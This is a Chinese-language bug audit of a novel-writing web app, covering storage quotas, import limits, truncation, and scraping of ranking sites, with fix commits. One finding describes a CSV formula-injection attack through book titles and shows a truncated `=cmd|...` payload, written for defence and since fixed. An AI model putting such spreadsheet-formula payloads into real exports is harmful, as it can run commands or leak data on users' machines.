- 位置：`src/breakdown.ts:179-186`（`acceptHeading` 的 `lastNo` 单调性约束：0 号章节仅在 `lastNo === 0` 前接受）。
- 行为：书里真出现「第零章」且前面已解析出 N 章时，该章整段被并入上一章正文。属于边缘 case，但「第零章」在网文里并不罕见（楔子/序章）。

### P2-12 清空每日目标输入框 → 目标被静默置为 100
✅ 已修复（commit 9258e48）：清空目标输入恢复上一次有效值，不再静默置为 100。
- 位置：`src/App.vue:786-788`（`saveStatsGoal`：`Number('')`/`Number(null)` → 0 → `Math.max(100, 0)` = 100；输入框 `min=100`，App.vue:128）。
- 行为：用户清空输入想「不设目标」，得到 100/天且无任何说明；目标值下限 100 也写死在钳制里，想要 50/天的轻目标不可达（126 行进度条按 100 基数走）。

### P2-13 灵感库 500 条上限只在「下次加载」时生效
✅ 已修复（commit 30759b1）：MAX_NOTES 常量两侧共用，500 条上限即时生效并提示。
- 位置：`src/storage.ts:126`（`normalizeNotes` `.slice(0, 500)`）vs `src/App.vue:725`（`saveNote` 无条件 unshift）。
- 行为：会话内可堆到远超 500 条并全部落盘（`saveData` 全量序列化），直到下次启动才被裁——磁盘里长期可能存着 700 条灵感，与「500 条上限」的语义不符；列表端也只截断不提示。

### P2-14 TXT 编码兜底的错误提示误导
✅ 已修复（commit 9258e48）：编码读取失败提示如实写明已尝试 UTF-8 与 GB18030。
- 位置：`src/BreakdownView.vue:342-358`（`readTxtText`：utf-8 fatal 失败 → gb18030 fatal 再失败 → 提示「请将原文件另存为 UTF-8」）。
- 行为：两个编码都失败时提示只提 UTF-8，但刚才 GB18030 也试过了，用户按提示转码后重传仍可能失败（文件其实是其他编码或损坏），报错信息未反映真实尝试过什么。

### P2-15 查找替换「全部替换」受 500 条匹配上限静默截断
✅ 已修复（commit ff979d7）：匹配列表取消 500 条上限，全部替换覆盖整章；单处替换后重定位跳过与替换结果重叠的匹配，不再原地卡住。
- 位置：`src/App.vue:856`（匹配计算 `while (hit && matches.length < 500)`）、`867`（状态文案 `第 X / N 处` 不提示截断）、`897-910`（`replaceAllMatches` 遍历的正是这份被截断的列表）。
- 行为：查高频单字（如「的」，一章轻松 500+ 处）时，「全部替换」只替换前 500 处，其余全部漏掉；toast 显示「已替换 500 处」、状态栏显示「500 处」，界面没有任何「仅替换前 500 处」的提示。用户多按几次也替换不到末尾（每次仍是截断后的前 500 个新结果），且「替换」单处后重定位（App.vue:893）在替换文本包含查找词时会立刻选中一个重叠的新匹配，光标像「卡住」。
- 建议：计数用无上限的全量匹配（或正则 `replace` 一把梭），UI 明示截断；单处替换重定位改为跳过与替换结果重叠的匹配。

### P2-16 作品 JSON 导入无章节/设定/聊天条数上限，可打满共享配额拖垮全局保存
✅ 已修复（commit ff979d7）：新增 assertStorageFits 写前预检，作品导入与备份覆盖/合并先算账再动内存；importBookJson 拒绝超 500 章、设定/对话裁剪 200/500 条。与 P0-1 的写入侧拦截配合，双层防护。
- 位置：`src/storage.ts:209-253`（`importBookJson` 校验章节/设定/聊天的**字段**不校验**条数**：章节数无上限（`item.history` 有 30 条上限但章节本身没有）、`chat` 过滤后全量保留）、入口 `src/App.vue:1480-1493`（50MB 文件闸，`flushSave` 在 try 内）。
- 行为：构造 50MB 作品 JSON（如 10000 章 × 5KB）导入：`unshift` 进内存后 `saveData` 立刻因共享 5MB 配额抛 DOMException，被 catch 掉、只弹「导入失败」——但书已在内存里；之后**全部**自动保存失败（P0-1 体系），用户其他所有作品的编辑在下一次刷新时全部丢失。删掉这本巨型书后才自愈，用户无从知道因果链。
- 同类：`mergeWorkspaceBackup`（backup.ts:138）`addedBooks` 同样无条数上限，合并恢复一条 1000 部书的备份也打满配额。
- 建议：导入/合并前按序列化后体积做配额预检（可用 `localStorage.estimate` 或估算值对比剩余配额），并给作品设总字数/章节数上限。

### P2-17 建书记录存档无条数上限（与导入上限 200 不一致）
✅ 已修复（commit ff979d7）：新增 pruneWorkflowRecords，建书记录上限 200（与导入一致），超限先挤最旧草稿再挤最旧完成记录，保存时自动裁剪并 toast 提示。
- 位置：`src/App.vue:1112-1123`（`startNewWorkflow` 无条件 `unshift` 新记录并 persist）+ `src/workflow.ts:80-83`（`saveWorkflowArchive` 对 `records` 无裁剪）对比 `src/workflow.ts:91`（导入限 200 条）与 `src/App.vue:1207`（AI 候选文本原样进 draft，字段无长度上限）。
- 行为：「新建草稿」可无限堆积记录；每条记录 10 个草稿字段（大纲/世界/人物…）可各带数 KB AI 文本。堆到几百条后与主数据共享 5MB 配额（P0-1），超限时 `persistWorkflowArchive` 的 catch 只改状态文案、**已有记录不会回滚也不会告警升级**，建书记录开始静默丢保存。导入限 200 而创建不限，语义不一致。
- 建议：创建侧对齐导入上限（如 200 条，超了挤掉最旧 draft 并提示）；draft 字段设软性长度上限。

### P2-18 榜单 CSV 导出无公式注入防护
✅ 已修复（commit 16cb104）：csvEscape 对 =/+/@ 开头与 - 开头的非纯数字单元格前置单引号降级为文本，负数名次变动等合法数值不受影响。
- 位置：`src/rank.ts:1056-1059`（`csvEscape` 只处理引号包裹与 `""` 转义，不处理 `=`/`+`/`-`/`@` 开头的单元格）+ `1073-1088`（导出列含书名/作者/最新章节，均为平台作者可填、或经粘贴导入/榜单存档导入注入的文本）。
- 行为：攻击者在番茄/七猫注册书名为 `=cmd|...`（或经 P1-8 同源的手动导入入口写入任意 `bookUrl` 之外的文本列）→ 用户导出 CSV → Excel/WPS/LibreOffice 打开时该单元格按公式执行 → 本地命令执行或信息外带（经典 CSV injection）。`csvEscape` 的双引号包裹不改变公式语义。
- 建议：文本字段统一加 `'` 前缀（或以制表符前置）；至少对 `=`/`+`/`-`/`@` 开头的单元格转义。

### P2-19 拆书 TXT/JSON 导入无体积闸：大文件静默截断 + 文本量不限可打满配额【已实测】
✅ 已修复（commit 30759b1 + 989c3b0）：TXT ≤10MB 闸、章节截断提示、落盘失败可见（P0-1/P0-2）。
🔶 配额溢出部分由 P0-1 缓解（commit 989c3b0）：导入后的落盘走 writeStorage，超配额会以中文错误落入本页错误区并弹 toast，不再静默；「大文件静默截断、文本量不限」与提示口径问题待本条修复。
- 位置：`src/BreakdownView.vue:360-373`（`importTxt` 对 `file.size` 无检查，50MB TXT 照单全收）+ `src/breakdown.ts:253`（章节 `slice(0, 200)`）与 `257`（段落 `slice(0, 2000)`，均**无任何「已截断」提示**）+ `src/BreakdownView.vue:387-401`（JSON 导入 `file.text()` 同样无体积闸）+ `src/breakdown.ts:701-714`（`importBreakdownStore` 入口只限项目数 30，每个项目的段落正文、`characterNames`（587-595 随已拆章节无限累加）、report 文本量均不限）。
- 行为：① 拖入 50MB TXT → `parseTxtBook` 全文拼接 + `createBreakdownProject` 建 200 章 × 2000 段，超出的章节/段落静默丢弃（与 P2-3/P2-5 同类，用户只看到「第1章…第200章」以为导入完整）；② `persist()` 走 `saveBreakdownStore`（breakdown.ts:692-694，**无配额防护**，同 P0-1/P0-2 一类）→ 超 5MB 共享配额时抛 `QuotaExceededError`，被 importTxt 的 catch（370 行）接住后以原始英文 DOMException 文本写进 `listError`（P1-6 同款体验），且该拆书项目**没进存储**，「导入成功」的界面状态与落盘结果背离；③ 大书经「完成拆解」后 analysis/素材又放大存储体积，反复触发 ②。JSON 导入路径：30 个项目 × 200 章 × 2000 段 × 不限长度的段落文本，导入后同样可静默顶穿配额，波及共享同源的其它 store 保存。
- **实测证据**（IAB，dev 源经 Vite 直引 `/src/breakdown.ts`）：构造 57MB 大书 TXT（500 章 × 3000 段）→ `parseTxtBook` 解析出 500 章，`createBreakdownProject` 实际只保留 **200 章**、每章只保留 **2000 段**（3000→2000，无任何提示）；解析+建档主线程耗时 714ms；建出的单个项目 `JSON.stringify` 即 **17.51MB**——一个拆书项目就是 5MB 共享配额的 3.5 倍，`saveBreakdownStore` 首次落盘必然 QuotaExceeded（静默或乱飞，见 P0-1/P0-2），刷新后这份「导入成功」的大书整体消失。
- 建议：导入入口先查 `file.size`（如 TXT ≤10MB / JSON ≤20MB）并给出明确上限；章节/段落超上限时提示「已截断至 200 章/每章 2000 段」；`saveBreakdownStore` 纳入 P0-1/P0-2 的统一配额处置。

### P2-20 扫榜存档 JSON 导入无体积/条数上限：提示数、库内数、落盘数三者背离【已实测】
✅ 已修复（commit 30759b1）：存档 ≤20MB 闸、「导入 X 份、现存 Y 份」口径、覆盖恢复预裁剪。
🔶 配额溢出部分由 P0-1 缓解（commit 989c3b0）：导入后的落盘走 writeStorage，超配额会以中文错误提示，不再静默；「体积/条数无上限、三个数字背离」待本条修复。
- 位置：`src/RankView.vue:619-632`（`handleArchive`：`file.text()` 无体积闸；`importRankStore` 结果逐条 `writeRankSnapshot` 写库；`notice` 报 `docs.length`）+ `src/rank.ts:1105-1117`（`importRankStore` 只校验格式与快照非空，不裁剪条数、不按保留策略收敛）+ `src/rank.ts:704-713`（`writeRankSnapshot` 每写一份即 `filter + prune`）+ `src/rank.ts:669-673`（`saveRankStore` 静默 catch，P0-1 已列）。
- 行为：导入一份超大「扫榜存档」→ 主线程 `file.text()` + `JSON.parse` + 逐条归一化（每快照最多 200 条）冻结界面；随后提示「已导入 N 份快照」，但库内实际只按「120 天保留期 + 400 份总量」留存一份，且 `persist()` 的 `saveRankStore` 在配额溢出时**静默失败**（P0-1）——提示数、内存数、落盘数互不相同，刷新后数据凭空消失。与 P2-16（作品导入）、P2-19（拆书导入）同类的导入入口缺口。
- **实测证据**（IAB，dev 源经 Vite 直引 `/src/rank.ts`）：构造 468MB 存档（6300 份快照 × 120 条，其中 6000 份为同源同日重复键）→ `JSON.parse + importRankStore` 主线程耗时 **1492ms**；写库循环本身仅 17ms，但触发 6300 次响应式 `store.snapshots` 重赋值；UI 将显示「已导入 6300 份快照」，而 `writeRankSnapshot` 循环后 store 实际只剩 **301 份**（保留策略裁剪）；最终 store JSON **22.37MB**，约为 5MB 共享配额的 4.5 倍 → `saveRankStore` 静默吞掉 QuotaExceeded，刷新后快照全丢。现实口径：单源每日抓取 120 天 × 200 条/份的存档约 15MB，同样顶穿配额。
- 建议：`handleArchive` 先查 `file.size`（如 ≤20MB）；`importRankStore` 按保留策略（400 份/120 天）预裁剪并在提示中报「导入 X 份、留存 Y 份」；`persist` 失败时给出可见告警（P0-1 统一处置的组成部分）。
- 同族的通道不对称：全量备份通道的 `rankSnapshotsFromBackup`（rank.ts:1129-1137）入口同样不限条数——合并分支经 `mergeRankSnapshots`（rank.ts:1118-1125）会 `pruneRankSnapshots` 裁回 400 份/120 天，但**覆盖分支**（App.vue:1530）把 `backup.rank.snapshots` 直接无裁剪写库：带几千份快照的全量备份在已近满的库上走覆盖恢复必然顶穿配额（P0-1/P0-3 的触发源之一）。

---

## P3 小瑕疵与设计取舍

### P3-1 全量备份内嵌 API Key（已有披露，但无脱敏选项）
- 位置：`src/App.vue:1503-1511`（`exportWorkspaceBackup` 经 `buildWorkspaceBackup` 带出 `model.apiKey`）。
- 行为：恢复弹窗有「备份文件里也会写入当前模型密钥」的提示，属有意设计；但把密钥写进会随手发群/云盘的 JSON 文件风险不小。至少可提供「不含密钥」的导出开关，或导出时对密钥打码（`sk-***末四位`）。

### P3-2 榜单请求留下空 `date=` 参数
- 位置：`src/rank.ts:1224`（`url.searchParams.set('date', '')`，注释称「清掉 date」）。
- 行为：清掉的参数实际变成 `date=` 空值留在 URL 上。对多数服务器无感，但严格解析 `date=""` 的接口可能返回 400 或按缺省处理不一致；正确写法是 `url.searchParams.delete('date')`。

### P3-3 榜单日期计算在 DST 时区偏移一天
- 位置：`src/rank.ts:261-262`（`localDate(offsetDays)` 用 `Date.now() - offset*86400000` 取本地日期）。
- 行为：夏令时切换日（如美区 3 月/11 月）±25h/±23h 与 24h 错位，offset>0 时算出的「N 天前」可能差一天，影响 `dateRange`、保留期裁剪（`pruneRankSnapshots`，rank.ts:675-677）的边界快照。

### P3-4 `maxTokens` 上限 6500 对最长预设无余量
- 位置：`src/ai.ts:113`（`Math.min(6500, Math.max(2400, targetLength * 3))`）。
- 行为：当前预设 800/1500/2000 字对应 2400/4500/6000，可用；一旦把预设上限提到 2500 字以上（2500×3=7500>6500）即回到截断路径，叠加 P1-5 整段丢弃。属于「改预设就会踩」的埋点。

### P3-5 设计预览（dev-only）下拆书/扫榜组件仍在读写真实 localStorage
- 位置：`src/App.vue:482-515`（`designPreview` 只换 App 级 store 为 fixture）vs `src/BreakdownView.vue:254`（组件内 `loadBreakdownStore()` 无 preview 概念）、`src/RankView.vue:327`（`loadRankStore()`）、两者的 `persist()`（BreakdownView.vue:255、RankView.vue:328）直接调真实 `saveBreakdownStore/saveRankStore`。
- 行为：`pnpm dev` + `?ui-preview=1&panel=breakdown` 时，界面上看到的拆书库是**用户的真实数据**（fixture 只喂了 App 自己的 picker），在此页导入 TXT / 抓榜单会写进真实存储。与「设计预览不读写用户数据」的契约在组件层漏了一环（仅 dev 模式，影响面小，但预览态改坏真实数据不可恢复——叠加 P0-1 无保护写入）。

### P3-6 `download()` 一分钟后回收 objectURL 的竞态
- 位置：`src/App.vue:1328-1334`、`src/RankView.vue:511-518`、`src/BreakdownView.vue:420-424`（三处同款：`setTimeout(revoke, 1000)`）。
- 行为：浏览器实际开始下载可能晚于 1s（大文件/磁盘慢），此时 URL 已 revoke → 下载出 0 字节/报错。10 秒以上的 CSV（千行榜单）在慢盘上有真实竞态窗口。

### P3-7 停批拆解与「停止」按钮的语义
- 位置：`src/BreakdownView.vue:444-448`（`stopRun` 只 abort，不等 AbortError 落地）。
- 行为：点「停止」瞬间 running 置 false（finally），但当前章节的 AbortError 还要几十 ms 才进内层 catch 标 failed → 极短窗口内该章显示为 processing，随后变 failed（见 P2-9）。纯视觉抖动，与 P2-9 同修即可。

### P3-8 AI 采纳的字数记账口径不一致：「替换」按全量、「划词」按净差
- 位置：`src/App.vue:1324`（逐章生文采纳，`replace` 模式记 `countWords(新正文) - 0`，即**整章新正文**全记为当日 ai 字数）与 `src/App.vue:1453`（聊天采纳同款全量口径）对比 `src/App.vue:992`（划词修改采纳只记**净差** `新片段 - 原片段`，负值被 `recordWords` 的 `chars > 0` 过滤掉）。
- 行为：同样是「AI 改了一段文字」，从哪个入口采纳、选哪种写入方式，当天统计差很多：3000 字旧稿被 2500 字新稿替换，候选采纳路径记 ai +2500，划词路径记 0（净差为负）。两路数据放在一起看统计页时会互相矛盾。
- 建议：统一口径（建议都记「本次动作的净增量」），并在统计页脚注说明口径。

### P3-9 划词修改原文无长度上限，整章选区可全量发给模型
- 位置：`src/ai.ts:134-150`（`refineSelection` 把 `text`（选区原文）整段拼进 prompt；`maxTokens` 被钳到 ≤2400 但**输入侧无任何截断**）+ `src/App.vue:951-960`（`updateSelectionBubble` 对选区大小无检查）。
- 行为：用户选中整章（数万字）点「润色」，全量选区随请求发出——上下文/费用失控；而输出上限 2400 token 根本装不下整章，返回的"润色结果"只是片段，采纳时 2400 字片段去替换数万字原文（App.vue:979-997 的 stale-guard 通过后会真替换），行为与用户预期（整段润色）相悖。
- 建议：选区超过阈值（如 2000 字）时提示「请缩小选区」或自动截断并明示。

### P3-10 竞品 ID 输入无条数上限，大输入卡死页面
- 位置：`src/RankView.vue:190`（`rivalIds` 自由文本输入，无长度/条数校验）+ `src/rank.ts:996-1017`（`rankCompetitor` 对 bookIds 不去重、不封顶：`≤60 天 × N 个 id` 嵌套循环 + 结果表 `N 行 × 最多 61 列` 的同步渲染）。
- 行为：粘贴上千个竞品 ID，`rankCompetitor` 同步计算加结果表格渲染会把 UI 冻住数十秒至数分钟；输入里的重复 ID 还会原样渲染出重复行。

### P3-11 七猫接口返回非 JSON 时抛原始 SyntaxError
- 位置：`src/rank.ts:1227`（`JSON.parse(text)` 直接解七猫响应；WAF/风控/错误页返回 HTML 时抛 `SyntaxError: Unexpected token '<'…`）。
- 行为：1241 行注释承诺「抛出的错误一律可读」，唯独这条路径把原始 JSON 语法错误漏给用户，用户看不出「接口没返回 JSON（可能被风控）」。建议 catch 后转成「七猫接口未返回 JSON（可能触发风控或接口变更）」再抛。

### P3-12 字体乱码熔断只认 PUA 残留，防不住「字典整体失效」
- 位置：`src/rank.ts:508-513`（熔断条件：≥50% 书名残留 ≥2 个私用区字符）+ `310-313`（`decodeFanqieText` 走静态字典 `fanqieFontDict`）。
- 行为：番茄把混淆字体的**字符表**换掉（PUA 码位映射到新字形集合）时，字典查不到 → PUA 字符原样保留 → 熔断能抓住（这是设计目标）；但若新混淆把书名整体映射到**字典命中的旧码位**（字符合法但含义全错），熔断不触发，错误书名/作者静默入库，污染 120 天趋势数据且无从发现。属低概率防线缺口，建议在熔断旁加一道「字典命中率骤降」的体检。

### P3-13 粘贴导入与「30 分钟节流」「同日覆盖」互相干扰
- 位置：`src/rank.ts:1266-1268`（节流检查的是「今日快照」，**不分来源**）+ `1311-1326`（`importRankPaste` 无节流、无体积闸）+ `writeRankSnapshot` 的「同源同日覆盖」语义。
- 行为：① 先粘贴、30 分钟内再点「抓取」→ 被节流拦下，提示「半小时内**刚抓过**」——实际是刚**粘贴**过，文案误导；② 先抓取、30 分钟内再粘贴 → 粘贴**无节流**，直接覆盖新鲜快照，只有「已导入 N 条」提示，用户不知道刚才那份抓取数据没了；③ 粘贴内容无大小上限（同 P2-6 一类），超大 HTML 在主线程跑正则解析可卡死页面。

### P3-14 建书 AI 的 prompt 上下文无截断，拆书素材带入可无限追加
- 位置：`src/workflow.ts:134-144`（`workflowPrompt` 把 seed/idea/title/outline/world/characters 全部**原样**拼进 context，输入侧零截断）+ `src/App.vue:1197-1199`（`maxTokens` 只限输出：title 80 / outline 2400 / 其余 1100）+ `src/App.vue:589-597`（`confirmBreakdownMaterials` 用 `${current}\n\n${text}` **追加**进当前字段，多次带入拆书素材可无限膨胀，无体积提示）+ `src/App.vue:1207`（`adoptWorkflowCandidate` 只有 title 钳 60 字，outline/world/characters/timeline 采纳后无长度上限）。
- 行为：与 P2-4（拆书报告）、P3-9（划词修改）同类的输入侧失控，落在建书链路：字段攒到上万字后，点「让 AI 写大纲/世界观/人物」会把全量字段连同任务说明一起发出——多数 8K 上下文模型直接报 context 超限（原始英文错误，同 P1-5 的报错体验问题）；即使模型吃得下，outline 输出上限只有 2400 token，几万字符输入换回有限篇幅，性价比与用户预期都失控。
- 建议：`workflowPrompt` 按字段截断（如 outline ≤4000 字、world/characters ≤2000 字，截断处明示）；`confirmBreakdownMaterials` 在目标字段超限时提示「字段已 N 字，继续带入可能超模型上下文」。

### P3-15 导出文件名口径不一且均无长度上限，长书名导出会被系统截断
- 位置：`src/App.vue:1477`（作品 JSON 导出：裸 `book.value.title` 只过一次内联 `[\\/:*?"<>|]` 正则，不去空白、不 trim、不限长）对比 `src/backup.ts:210-213`（TXT 导出用 `safeFileName`：去非法字符、折叠空白，**同样不限长**）与 `src/RankView.vue:509`（榜单 CSV `safeName` 有 `slice(0, 40)`，三处口径各不相同）。
- 行为：书名可任意长（建书输入无长度闸，AI 产出的 title 也被钳到 60 字但手写不限）。300 字书名导出 TXT/JSON 时文件名超 Windows 单段 255 字节上限 → 下载被浏览器截断或静默失败，与同目录其它导出混在一起认不出来；用户从三个入口导出同一本书，拿到的文件名规则还不一样。
- 建议：统一走 `safeFileName` 并加长度上限（如 80 字符 + 必要时追加短 uid 尾缀保持唯一性），三处一致。

---

## 已核查为「安全/无问题」的疑点（供后续审查免重复排查）

| 疑点 | 结论 |
| --- | --- |
| dev 代理 SSRF（`/rank-proxy`） | **安全**。vite.config.ts:5-12 用前缀代理锁死两个目标 host（fanqienovel.com / www.qimao.com），其他 host 段直接 404；浏览器侧 `proxyPathFor`（rank.ts:1145）白名单与之对齐。 |
| 番茄榜 span/div 包裹变化 | 已由 tag-agnostic `blockSlice`（rank.ts:349-365）消化，同段落内标签重组不丢内容。 |
| 手动导入后重复抓取 | 抓取有 30 分钟节流（rank.ts:1267 `MANUAL_RECRAWL_MIN_MS`），但**粘贴导入不受节流、也不受同日快照来源区分**，粘贴可静默覆盖新鲜抓取（见 P3-13）；节流本身只作用于「抓取」按钮。 |
| 字数统计负值 | `recordWords` 过滤 `chars <= 0`（stats.ts:39-47），`recordWordDelta` 亦只记正增量（App.vue:791-793）。 |
| 榜单 CSV 导出覆盖度 | `exportRankCsv` 取 `size: 1000`（rank.ts:1070），单快照上限 200 条，导出无截断。 |
| 榜单关键词搜索 | 过滤在分页之前（rank.ts:816-817），搜索作用于全量条目，UI 的 100 行只是展示截断且有提示（RankView.vue:135）。 |

---

## 修复优先级建议（供排期参考，本文档不改动代码）

1. **P0-1 配额统一**：一次实现「写前预算 + 写失败全局告警」，P0-2/P0-3/P1-6 的「乱飞的 DOMException」问题随之收敛大半。
2. **P0-4 损坏数据处置**：loadData 损坏时不自动覆盖，保留原键内容并显示「检测到损坏数据，已暂存于 …」提示。
3. **P1-1 / P1-3 / P1-4**：三处账实不符（统计虚高、目标值被抬、合并少报），都是几行的定向修复。
4. **P2-1 校验加深**（已实测崩溃链）：`isProjectData`/`normalizeProjectData` 对章节元素做最低字段校验（缺 `updatedAt` 时补 `now()`，缺 `content` 时补 `''`），成本极低却能同时消掉书架渲染崩溃与备份导入注入两条路径。
5. **P2-15/16/17 上限与口径**：全部替换的 500 截断、作品导入/备份合并的条数-配额预检、建书记录创建上限对齐导入上限——都是「先报数、再截断」的少量改动。
6. **P1-9 删一行**：去掉 `fetchRankText` 里的 `User-Agent` 请求头（rank.ts:1165），扫榜抓取在标准浏览器里才真正可用；顺带把 P2-18 的 CSV 公式转义补上（两行改动）。
7. **P1-5 / P2-4**：AI 长输出链路（截断抢救 + 报告截断）一起改，拆书与正文生成的健壮性同时到位。
8. **P2-2 / P2-1**：把「备份 draft 归一化」与「章节级校验」补深，崩溃面收窄。
